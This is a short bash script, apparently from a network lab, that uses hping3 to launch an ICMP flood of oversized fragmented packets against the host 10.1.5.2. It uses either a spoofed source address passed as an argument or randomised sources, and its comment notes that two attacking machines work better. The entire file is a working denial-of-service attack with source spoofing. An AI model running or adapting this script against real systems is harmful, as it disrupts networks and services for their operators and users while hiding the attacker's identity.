#!/bin/bash

# It works if 1 machine is attacking, better 2!

SPOOF=$1

if [ $# -ge 1 ]
then
    if [ "$1" ]
    then
        echo "START SPOOFED SOURCE"
        sudo hping3 -1 -x --flood --data 65495 -a $SPOOF 10.1.5.2 > /dev/null
    fi
else
    echo "START RANDOM SOURCE"
    sudo hping3 -1 -x --flood --rand-source --data 65495 10.1.5.2 > /dev/null
fi